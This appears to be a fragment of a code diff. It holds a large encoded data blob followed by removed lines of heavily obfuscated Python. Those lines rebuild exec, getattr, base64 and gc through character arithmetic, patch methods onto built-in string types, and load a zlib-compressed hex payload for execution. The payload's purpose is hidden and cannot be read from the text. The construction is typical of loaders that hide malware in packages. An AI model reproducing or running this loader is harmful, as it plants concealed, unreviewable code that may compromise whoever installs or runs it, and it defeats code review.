k<>RBe2d@`P)|kNfB{y6F08j0zMp{(S_J9EjL}~7XCyj#`jm!;#Rs{A~Bm@7jQrcrOlrlT|w^Eq>z#23DbW~344_L;3ZLr0@{)czQd8Oy7yWXp~stVuXe;BnV9IO$Q{YjBcD{$$qL~E%ui#}EfaZN?p5UbsCKF>h5iI9Yj@a8baw_H6muZ4KQcN^qo=)b8{&X{-w6gl-C06ACOZ>zw_;+PJHA%`c6Vqu5lBSSgCE;X8m4y)vt(C(?;D+`{iXjKhGQsKGHlwZbB*^3zn*2>4u1TLylF+KRJ~3?f?&XYkH*Tq;v+{uaNC3dQ#H*DhzBS0hX&I>Fc*wxFHFJSBGn*-0k6$_o!DYC4j|1Pz!l5Z<9QT8c1-+#fCE`(Zbj+9^pL>IhpYaiFhR^c$;bAp^sSc$Y!gcDC)h%)+uk)43gPz_P8;w?5K-0k5b~SZHC-+;W(R+ibk?7?g_@oHT`#@5vU8YB$y>5HEw-NS&|B<_ha<-JC~x|OpFb%P+&S7NS(_t~A(|j+yZ*H7l$oGG)ohSU6+X(hfFHU)tpXFRX{oR1QsKmeN6~jNB>1ue(>Y}5+TeF!1~zxm!O_D!MCcQeR0)t@#jHQ1RG%pGoa&VxdX_B#x8)22YN6>gX3Y4>-vyT@c<bPkak+h$s>%x00<ENR*N=bK%I^&oBDp(XeRmEAU>`<ggOTh$OH%Xn=|38emz5%a3hrhOH6jJlo|uAU9Y>7HN1jVqDn=Ido^}J2kg_vc|Ml@l$#T&{uN6)Ab=B5JA6H!Vpy#hwuOUdz90EhP3bilk;An`HOoq|W-P~Atx&L;hxA;u6RMUYgWhSg7#RfY^9s0MUQ_NGk-}+f+h{w%^BiRu$;Ecu^<Sdc*-lEQlpP^o~#yTq&b&yJNTv|{dcHBiar6~_v!M9Qvq*QctZDH~8CBfv!G_&$DFr1!ha|>pS6t}Cl8g23X$lY?`P>cD9N_2y*TBWY^%*#1F>g|Wxfz7Rvu!jh&u3exSs8=N-&TDL5Fp93t59G|A!Sl_CO?;|_<W$8{LW?OjTY3~a(rTo!sl92({=$wdXJdLBve^ylpn7CRea1lo)=W!=C0(?tOlqI>DsX*L&E4!|LX#`hTfm>u0Bdpt|2l9kqmD(^)h#>YF)7ZUYEwfZb-x5llngvvP3kR0j}LDs`oW4JXmMLpWw#|&VQdKMkE)%RK+0y)K5fIEcq*|NqqUYoc)KBWOwHvn{d|pZH$rdyi(kj&qh8mR-@k9Y{%s)Q=Um@Nk3jU_E;I2@NOO~Pw7<*|Z(K0UBUbToImdMJd`$qlb(%Kn&N6ld?6JdY*=L6RkW!33m_2k!jrfHz`iY^q@m2Ro0k3}LFhrVpmm(z~8>znWEdUj$PQ)Ky^g62YF{<u=RkguuDUkS-qI;=hD%*su;5LN_WsvxjWPQn69#f&0Fh^8HHzGB*I0Ak}#y@MKYLHyFJ~wyg4cfTUdfr{&DSt@7ktb(jibI<dfzv#88_917tzL11iZPVvxitUXV3Lkn1~IM0Q^8#duk+W!4gYV}aw?NPf`MsmV9&B;rA(Gp{TE-*!|8;yy8%JbZF~_dRO1!X^$OVTabn*HJ<}Ty5PbewQB*oBm;Gx{%-wrxPJbl480BjsTc)T1nC{!FntoebtW^+Lq=@Tro2NNstfPQ+0Hm(r)J{@5b_R8kPQPzbI|KrxuUn-KY&jA-nez3G2$f8g7)jIILj|#Uw58quN|zZ<F&+V<!&k2V_>?0<LnO3z9WALX&wFyAk^5Xfw72DduoFCBQ9vh2yGpYpSk%!Dv&G`q)~72QUe2fTb-k-kiIC+dL3Y6T-oLQucgJ8F4g|(E+l*W$PdxCGtjS2u^s`k~rlW(s#d=(e&zHt5jPccGYvL%K4*`uUsGv;>+jaeyhl(G{k2K-cOY<MARThU;@ac_?nT0XVK<mqZ#8&1{{R7BNln9EQ1PVmKowhZta)#s@sq-YDZAUZ=3g}y(X@K_#N}@oNO%Be$?;HhlouBD(&-PiCXbu~PNKy6YShvo${hbcd`to1S0@;E657=ayZpCBfzm7GwJ<hO)jzKW48M@A}<eiOARc$@DJuEN71O1%}m;i*>gP9bMVlPFMnIx|bnKO&7vX$EZQfiXlKn-lc;T=|*98uC^Rq>C``0+4rWJ_1=ujkAdN`?;i+hJ=kJ~&pEHJcvxH!^!aX~i*xnI0)08yHGr_7Q_wddtKnpHh{!f%exG{!$<4jXql!DPnt;|A3e@J`Dg1U>lD+PGu*(me2j#P}G2!m3PJ&oC9vX2<9&{PeZE4bL*A05e@=$9pX6w5^y99>YdKolD$G(afi)O|9p^}1(i1-#8VSK($!4QxJ_NOoJT$~yU!;HccUkrs6%D!drQwL-caPEV~N~2|JZ>XJQpFqZLS|lHYcR37i7-DO|aS9?=YSYXq@S0Csf^TKj-r=#*)P_vd0nFi`9-v)aMwA;C#!)bS4UoBV}xpvcd}eaY%?|s;-<o|GhO`dne&%XVj%VCS1^ZKnKmwnBZjU%BjZa)wT8m4;2OBZbf0onvD>|fZm*PYv$wtgTG(4csAVJdxQK}k}9f{CcHU4sH%Z|p=v5t1Du2PqrN*S)a&578~fwIKGIv+RQ^mOYmsVB>#wZ92dY@oQvboBWt9gYiry6~U&h16E5p0ao&0Tr7%S-dY@xZRUvl@HkjBJmE|`*tr1Q2D&I+?9o5q6fwWflpk?zJA8R_7KG}9T>@MFf2u9;W`h_<2YZAV%0H&8OHDsrrv3$Jyr+ihn(V&TJ-N{(t`Prd`N9EQttRg`i3s|O}iEop$-bP?tN$~HsfP4W;2RA<x@`k&K&$pcJeYFi{m7$R(E;)R*8aE%__gq9zUQ4ueW(!E7y9sW%mhZ5qI=h4wY%~bsx;Bp-NQ@d*j3q22B|Axr422i;#^#k}7QGdQUMr%~TFwY307)(5=eW74h+8XqsmgpPW+(~VMh(nu~l!HAXIN*7(P7Y(2gIs=ko%0EOm1yLClnaSgmlK}KJ1Z3i(7nc-1^hWV)k{%()f8EAq5<H^Kpr8(ay7ON^KB?b5FJ==e6)K}n|eWC1BoKgY=t*(rlV~&ZA;xxDDs!bEzktN?;#D`y@oZsmb2{i$U)A?6Kh^^aIcg(T~$wjSh!n^!zDv48iWb0k>|2ft-;sX#C;B9;aVwo&~2WbV*qTGHm7=Usb)SdsI`?!yZNz(-Nb&3H8gQBt<fuR#vDn5DWaP%sca^|>mM)Qxql4*R$Z5vG(TbbrzbO8#!>fHEr+7p<4%vW|6(MIsoo1c#N#Z((Gzn_hskt-CW~*`(O5)+*JTIbkaSwr(yuWnP&fq=<@fL(X`MKkHE?X9pyj27Ibd1*-uW4D<@%bf$FW=5lY`tHZahiaEhV%qi(mss4n$(kbg5;2ZDf5IK3;c5xE}g(ULq`qatLC36B3JZy=cmsf>Bl86IfH1e33|~a`E_N9!~y6=IO0?K7xddP*Ikk9z^jqAQU(zG!kTut%0;gD>@5)EZ?J@Rz_?@7$J-+V3ccbtLZ=_e5+GsGtl_ZfLAkyFA(%gr&$$a7}v>!pvKh{mQfR%6qYVEB!4*IlJ%F<TX~+C<;6A_LL-JB*m6jL;!8VusS}3=g_PT0c7G&oN#oP}?_`*+KRtB=Cs*4)Iv(vZouLaP$g<yG;^BQ}nCXvM{Io1ObR9Q<k9h)cs1@MQ<W((?0<lQIzp)4~L_JQ{DTqqu^{7#MHNYrI3wBrac_wn6NpR130}I-5>0}}$DVoTN3j-o~CY*cCaP1}<7>Ai<X?IBQaQoWu4pZd%iIG!vAF*5f-bAz)p((67IDn#OEf`X8`*y|%Sb3-`*{mp1IW?#62GX9b=~lv(;GYTQ^M#e#(umF5@#STn8h^G}Ayr#}n7N6&k|0Sg^-6ukkeRV@(B}5@5#eY!tM|Tp6DTa{u}9pKsEa<gEGMNqoH;u&3~0FJKysaEggC%8sXTv(2?k=8lN<-l(L`I<q^Szi%19Kb=>Fvf!q+ooZrIwvZH(_9wf_VO6Ov!2Om#^40C4Ap{JmP7wY&xnl+nY>J)oI?H`bmm^8>LkZ7EdkP9)t*uC@^M!ja)Q-@?SHu;GbOpMv~@gm-b&jQRBIeK`HUH1cf3c^6oKck=)f%tAJNRi10%Q9JZ}rvG+SsASpcjQ<cmet_@~4J_>{#=}tCpm8+q=TZzg#Dm}8{54*ovV~W=J1m)!Mt8GajY3T5?eD<~9E}sxhoQOm9r`O$xUgz?s-qbJO}D@%G@8J)_NjV{`H(hPH^|aFK*bZr5MLSV8oGZzOqq-p<(y()_VcXhE&?(oB00H~+`&FE*(M^G9cF+*csa8qH6*h(&Z#|eLHb0dMpIg;KP(x?VQj-0yk3KrArm$6qOVRv7~Bm85U1!nX!~UC-pqY}o7^dVH4s_JL+eGCgpg0fO0nX;$uWu+N{&oWe1!CPXPlGG**wfw%_kK*F#|vEIvGyh0UigQR6r`SdchJt!y#<j-o{IR@SR_BPB{^%rw2&2s+gfzpC}W0hpk}f8v3-~gdqOR4};ClaTly5O08I8KquThE!6#F?3SDia@%Ssr?Q~y8a4B<XN>P$8qkf^D?Y<OJtrzL7Z!r0G{*{S?S-SyQW#IV`jFF!_bUxw<wGgd2fgPw+qu!ZNP__;{j8+kI?>!i_pj{^H{m_zpNA5^^K*+16xFJge#0$Gk8y|oqARAgsh=Cm*&weKYf3dGSSD(oD7~BGOEEd}3=k@9374{@ZEE24!5Axo&xh_abH+&nQU_pd)bN2p%+#;BX)!J&sefJ6y2cSq0@+Gn;s(Z!Box00#837onu6V%1uoKAh<Tcw0%A?$vM+x;fX^I35?6I$AGIf>(^$P#v@aO}Fq>0y<x=x9P@Yivy3X3gZf(8+!q~L}l$CRJ&e6$91Ee`+#~qI++*MOsQ4+y0sFN-DwXJgTrL)a+!}^{;n_jEga1fSqU5pGr^(J1mOEWGC``>Jrw1jKT|Az@<|Fx}nOCe2H?A^KD&^=RW_xkM711+&3q_}644A9NaH!^drVL;$wHZxi^?mMEhcVFp2s!6$tT~u`!NKMaKlsnhJx0k0u8d{biq?j6{uX^<qmJpGJ@DCWYAxikJ)0Ni%7gK?Na-SQ3<v;!=;Kck&17UMI%Ky<QXxa1L;h5eo<iUxdFyPMT1L?*G58AV`cFW<DP=U0KZd1kXE*HBt5p!5ZH8gVjR2~rXxoc&Ol|7{U@umkB%iM&Ix2Wy-T}@Wge(<7&@SsE28+D^+(!}|&*j~i}7aDml9Kyf;D{($EIg0>N8p26jHBmsc^OC_0JkbX)IID5T9G3YR??0Vg;|_uCyP<+5bV(^C=(}sD`I7rbdIS5ZV}#0lRKW_DfvPxm%y}0u?w<ogeT2Z?CzdXs`#aR9eNy4*mi?xu*fh-?<Wxi6i40=n#TBJ5Nf=xLs5B4^eC3#U!u$pdcp!tqi>GQ@s2vbLztRM?Bp3NKHJCcK{Zb#_N9APn(qnQn(<ImKnQN}Cah{&J>}FrXl$hFb9W_&9`&Hf;EVpc7JRrUv(HpFb*IpJLY_o73)etu6Bim5JWuNf4fo#Pb_bMQ>$k9>n=!P~y3&tnwBw=aBy|azsUr}X`o{!BlRV_wJN1r5gy=NxCdMu?ci+Exh2>xgiac1cVG`+<<w1Yy8{nNyzjR~sF@5H%DXD}~W7$o!?5FGiWjOI3-q1c8)GzDwdjnZ1LKH)Gr1Vb*o7)Lfi6F$*661Yps>;ID7)j5%{(<7P8f~^pxzr{u&mUcb-++D`b@>=fgot@=OIbiY{n)XXegRJn99Ru}1lRd()L1fNC!`!~(v_B9B&kI!;PO&X&KtaKe(W#A@IHcvp#ue%DpMxZr366!o!k7G)QjttfPSEglnxO<4FI<j(O<wp<W?7yFmw2&^O!`o}xV0}(-Q6gDUWD#U;3Yh~fzh?!KC@s!?7e1;IJX4u=F434pzi^6;1|~?Qp6&0L$2%VIVkE<oj>MrfHvcZg-?GZHcdY2n7cgfrq=u9G2K2;nV`Y4aHeup!LmOM$6yZXm2=7*oo)f|n7i0d{(1)^z0*|`jlz=A=d?k?!gT77pMniz9^Tw}gpwmmek;ja<l`xf9^;HtWoi@H13g*A;_!*KVL1)}f`<GQ05^9novZZ(d(bY!hr%z4-}xo>?1hKA-NO~f-eR;3Xel`Z2GX^RB{+1Fo?$rqqLr=?M#8D-mr4_f6gMK|`=V_t2{>AegtG1>jD5}GQz)|ymAR%R0#a(@-$#d7dqk+UC*WUex5+yBBYd0&oRk2O>Hrf@O|+QkcOF#17H$zv(dO3SrAO*+y&=l-iL+?X;r-M|bv$h>)b{~Vk$qAg6E``%HZ;n#KGL!p{qJwO81WX7cqdj`eTlP^=tk50$^Si%jIewg(qs6bG+^$@(v4FTB4x_kb6j+<q2m2e#-lavOI;$=Y{Evp98};4t@@FKEi<1*%EX4wHJIwVm(EN&fR7m!+k+dK<<8CYY!jw&%Q!sEGW0woztg)CPwqoN+hW5VT^C^9U%x<eW{~~sdGe_gHOqbO+VHj3ER>D#_e(8`D!k6-6kN!rR{#x-c`UqQIR!|37oqTC^^r4N_|L;}D^uqMtUZ9#D25&6J3O>4f0kQ8Id+{<m&BUzF1S-b$0L3}wXyxobD5}EcI|<=5Ub$=X`L--%asLCk`b*TNw69IUk~QlW{29u>+a(p9y5=2xioY;QctHrrFw(~5`pKBkb&*plt&A<gTqy3yNi#u*UZgmD4z%je{~*Avzbc6dI`>p8V0vG`6=_LSj`)$d`Fft|LBI~r!7IOZ52V2XffZ}0#x9Su-JFYg(xz5SL4O;6*?Tns@<>8_8x`=3*U$0g0h2C4R~@aG8p%g3U0qRTz^Vg%UKCIzJ=Q_T&^n065&@^`M+3Y-WMIDc||Az&T}LA<F-SSea0^#I@f~!bOnhi1qr8g6p3zs7*cpZ=pGY}>IZs6*Y`_V!wT1#V>&yy*M*RaJ0tY78BpA}!LQxxo^hivG}(vgHugyJ4%s19_9q}myfRsO#4BY;jcF^gdIkI}G3N?8ESqmJCk}<g_MW!P;vNXG`kOs#xDmOCd&U6MH4(HjMKy|xwu3f@J74GuZIaV))2Zxgx|4h|whN&hIQKWzQ!M#1n9xn0HOEP`n4i%Z7dsGR=)Pe`%da{XJ;-cuD2dhhEvZxcFYh{`;-S4<9s~h_?-AhVgpr~bzR|W%vb`6RZ$5%O5}*i(X6BoEfGmck(2;vU;TPvPTecs?v{e5T{voIF`lcG-7Sp?`R@&LSGU_&LmF#PVG^fcm4>6)|5~%YtP$|cl@%%4?PqY+ZCf79OukXPlU)wS6sDF2Ucst<LbSN|57he;I=_4IRN?#bpOwmegDD*j_S+o}mmzkpttqk2)p7x<qvdLqYChVtB2?dxmIB=iooq0Z>jQ"""})
-lIIIllllllIl,lIllIIlIllIl,IlIlIllIIIIl,llIIIIIllIIl,IIlIlIIIlIIl,IIllIIIlIllI='','','','','','';lllllllllllllll,llllllllllllllI,lllllllllllllIl,lllllllllllllII,llllllllllllIll=globals,chr,locals,__import__,getattr;lIllll=73;lIlIll=108;IlIlll=98;IlIIll=97;lllIll=101;lIlIII=103;llIllI=115;lIIIlIIIIlllIlIIII=lllllllllllllII(llllllllllllllI(lIlIII)+llllllllllllllI(99),lllllllllllllll(), lllllllllllllIl(), [], 0)
-llIIIllllIlIlIIlII=lllllllllllllII(llllllllllllllI(IlIlll)+(llllllllllllllI(IlIIll)+llllllllllllllI(llIllI)+llllllllllllllI(lllIll)+llllllllllllllI(54)+llllllllllllllI(52)),lllllllllllllll(),lllllllllllllIl(),[],0);IIlIlIIIlIIIIlIIIl=llllllllllllIll(__builtins__, llllllllllllllI(lIlIII)+(llllllllllllllI(lllIll)+llllllllllllllI(116) + llllllllllllllI(IlIIll) + llllllllllllllI(116) + llllllllllllllI(116) + llllllllllllllI(114)))
-IlllIIIlIllllIlllI=IIlIlIIIlIIIIlIIIl(__builtins__,llllllllllllllI(llIllI)+(llllllllllllllI(116)+llllllllllllllI(114)));lIllIlIlIIIlIIIlII=IIlIlIIIlIIIIlIIIl(__builtins__,llllllllllllllI(IlIlll)+(llllllllllllllI(121)+llllllllllllllI(116)+llllllllllllllI(lllIll)+llllllllllllllI(llIllI)))
-llIIIIIlIllIllIlIl=IIlIlIIIlIIIIlIIIl(llIIIllllIlIlIIlII,llllllllllllllI(IlIlll)+(llllllllllllllI(54)+llllllllllllllI(52)+llllllllllllllI(100)+llllllllllllllI(lllIll)+llllllllllllllI(99)+llllllllllllllI(111)+llllllllllllllI(100)+llllllllllllllI(lllIll)))
-lIlIlIlIIIlIllllll=IIlIlIIIlIIIIlIIIl(__builtins__,llllllllllllllI(lllIll)+(llllllllllllllI(120)+llllllllllllllI(lllIll)+llllllllllllllI(99)));IllIllIlIIIlllllII=IIlIlIIIlIIIIlIIIl(__builtins__,llllllllllllllI(95)+(llllllllllllllI(95)+llllllllllllllI(105)+llllllllllllllI(109)+llllllllllllllI(112)+llllllllllllllI(111) + llllllllllllllI(114) + llllllllllllllI(116) + llllllllllllllI(95) + llllllllllllllI(95)))
-lIllIIIlIlIIIIlIlI=IIlIlIIIlIIIIlIIIl(lIIIlIIIIlllIlIIII,llllllllllllllI(lIlIII)+(llllllllllllllI(lllIll)+llllllllllllllI(116)+llllllllllllllI(95)+llllllllllllllI(114)+llllllllllllllI(lllIll)+llllllllllllllI(102)+llllllllllllllI(lllIll)+llllllllllllllI(114)+llllllllllllllI(lllIll)+llllllllllllllI(110)+llllllllllllllI(116) + llllllllllllllI(llIllI)))
-lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(lIllll)+(llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(73)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(73)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(73)+llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll))] = lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(lllIll) + (llllllllllllllI(110) + llllllllllllllI(99) + llllllllllllllI(111) + llllllllllllllI(100) + llllllllllllllI(lllIll))];lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(73) + (llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73))] = lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(109) + (llllllllllllllI(IlIIll) + llllllllllllllI(107) + llllllllllllllI(lllIll) + llllllllllllllI(116) + llllllllllllllI(114) + llllllllllllllI(IlIIll) + llllllllllllllI(110) + llllllllllllllI(llIllI))];lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(73) + (llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73))] = lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(109) + (llllllllllllllI(IlIIll) + llllllllllllllI(107) + llllllllllllllI(lllIll) + llllllllllllllI(116) + llllllllllllllI(114) + llllllllllllllI(IlIIll) + llllllllllllllI(110) + llllllllllllllI(llIllI))];lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(73) + (llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73))] = lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(100) + (llllllllllllllI(lllIll) + llllllllllllllI(99) + llllllllllllllI(111) + llllllllllllllI(100) + llllllllllllllI(lllIll))]
-lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(lIllll)+(llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(73)+llllllllllllllI(73)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73))] = lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(116) + (llllllllllllllI(114) + llllllllllllllI(IlIIll) + llllllllllllllI(110) + llllllllllllllI(llIllI) + llllllllllllllI(lIlIll) + llllllllllllllI(IlIIll) + llllllllllllllI(116) + llllllllllllllI(lllIll))];lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(73) + (llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(lIlIll) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73) + llllllllllllllI(73))] = lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(116) + (llllllllllllllI(114) + llllllllllllllI(IlIIll) + llllllllllllllI(110) + llllllllllllllI(llIllI) + llllllllllllllI(lIlIll) + llllllllllllllI(IlIIll) + llllllllllllllI(116) + llllllllllllllI(lllIll))]
-lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(lIllll)+(llllllllllllllI(lIlIll)+llllllllllllllI(lIllll)+llllllllllllllI(lIllll)+llllllllllllllI(lIllll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIllll)+llllllllllllllI(lIllll) + llllllllllllllI(lIllll)+llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll))] = lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(102) + (llllllllllllllI(114) + llllllllllllllI(111) + llllllllllllllI(109) + llllllllllllllI(104) + llllllllllllllI(lllIll) + llllllllllllllI(120))];lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(lIllll) + (llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll))] = lIllIIIlIlIIIIlIlI(lIllIlIlIIIlIIIlII.__dict__)[0][llllllllllllllI(114) + (llllllllllllllI(lllIll) + llllllllllllllI(112) + llllllllllllllI(lIlIll) + llllllllllllllI(IlIIll) + llllllllllllllI(99) + llllllllllllllI(lllIll))]
-(lambda lIlIll,lIlIII,llllII:lIlIll.update({lIlIII:llllII}))(lllllllllllllll(),'lIlIIIlIlIIIlI',"""789ced7dffae23c9cdddabe4cf19ef44d8bf6dec2be40516036163af1d03febc1fec0d9220c8bb67e6ea5e7557d739e4295655aba5a660aca74b248bbf0e8b6ce9b6ae3ffde397fff8ef7ff9e5bf5cfff8fbfff9cf5f3ffde1faf94fd71faf3ffdfbf77ffde9faedf5d35ffefee7dfbfaddcc97efce3f5c7cbf5fae7dffef2ebf57af9f36fd75ffef5b73ffff63ffff9fb1bf91bcb7ffbed9fbf7ebbfaf1a7eb8fdf177fba7efaf99bc84f9fbf7cfbdf77824f6f8b3f7eba89fce337caefebcbca6d936f6bc5d23792b7e5cf5f3f7f6cf5d3cf5fff84c5df7579dfe39b395faec5ebe39deba55cffc67e81ffae973e7dfefcf9e76fff7fb9fef1edbf7f78fbefd71f2a01df087ffef4f6e6f50f37a21fdefefbcd94779de16b808a3725973d3e44fefcf5cbfafacde3adbbbce5cb76fd6dbbcfdfd2e84766d8870afff9dbffa2a62f49f95dfe5ffefeafebf50b79f39fbffcc7afeb77b7dbfc8f5ffff79772e5b77ffd056efcf1fedffef1db7fffe51ffffeb2f6ce2df91a3c041cf6f1ce3d6b40a6d4b4ef8953e4cdb7c4c149767bb77a93e7df0fb5092b3937dacf50cd15d9e74f37076d22bef5de8f3ffd747dfb77f5ba27faf5af7fff078c6641553aead337f22ad75679fdb75f7fffe5f7dfff4502f2e91b027ff6c2f0fed612392174ed3c4ccc4a842fe39b37423bc6f46c526dc3461232e6a35b20bf49bd55e2900933620a79bed55e581d3f12fccfbffdc77ffee35eb68af7de8bdedf56206938258c3ac0cbc0c77bef75e853598fa0b8cff777e1db9b5af61914986af7a015cc2166d4adcda9874b2cd0539d46ebddbfd75b2dfb20fbfbefbf7e6b5c3eaefefa8fdf7ef9bd925ca6c69ffff1cbbffffd9e1d1da7fbbac0fb596ed35aed4f89840f43ffefff7bebf2423aabe725b160eca1cc76b99d9a7672fdfcb52a339f3e498832c1f97e8550075e6e16ac08c4dafb669709e077ef92ff8e50bc25b91171281076cd7403b24e88ae34fd3e3ffdf4cef2e9e72deffb20458fb2b793f66306eb13f3feaf8e36db33f590b0bf8dbbc541f069e0b11a4caf5ad5840d0af3471fb4a679b4c257dc8c36764a0d60b811ffd7f77dd72dc9a6e7781b0de721cbf38041eb9f67dd5e324af0278cfbf545db316e236b93833fb4ec2e141b90e2d777277e7862edacb7e28fc5361642e4dcade6eef0e1aafa41cbef32dd527dc3f671fc4526a72214ada55babdca890dd2bb050a73f6f1db282fea78d53bfed0f1bb90dd5e2bb4ac06d1d84e6c795986f56fefdaf5b077d5c7feb51ae3f7e357a92ef13dcaffff8f7afdbcdbf6ffb6d9b46c97769555a7cfefcd7dffef5a6f9dffff9bd1b6077affee847fd7b58fff85186d5eeb930ee2d34354b41f63d93ef778eb7ecef357ebbfa66dfcdd0dbcdc1efb67e102cbddfe7cf5ff17d8ef75e702d16e6c42d3ad5faa7755e6c48be5dd2fc64e0a7c9fa7603ff63889dd7d45d3fca1598963f762b36bb7e0079bdea74265f80d46b5d24b63a7d81ea5cabfcc3d59addcf204e2cdd82456e659a8e225111c2712fcf5fd81ef5e90663649ea5d567377e60b436b4fa44c5d1dd58ad0270ff8cae73401c325f0ed1e44dc4fd738aefafcb7529076fffffc376fdc216ebd5f205182f8f59d86a7595b4af09a02b88fc82ee525f07745cc800ef768bda840be5f53626567a264944ae6048234b65e1800c8af99c46c88e8b279daa5cbc19c9ad58cae1a4199926fba157e6370360d1bc0206d62c034b141668c51a655e5dd126a6be938a0b6b7fdd5dadf9ac585fd14821f33c3a01435019e42c1dcf8cb7451e07960239d187349263c3d55b26fd32d490928af26e4959581350615954b5d1714b3497d7e15c9195ed38addf17b6f7382a7aac0bdc1c91123b73ea6bca1279b2c0cbfe2ed1f2f1ecadad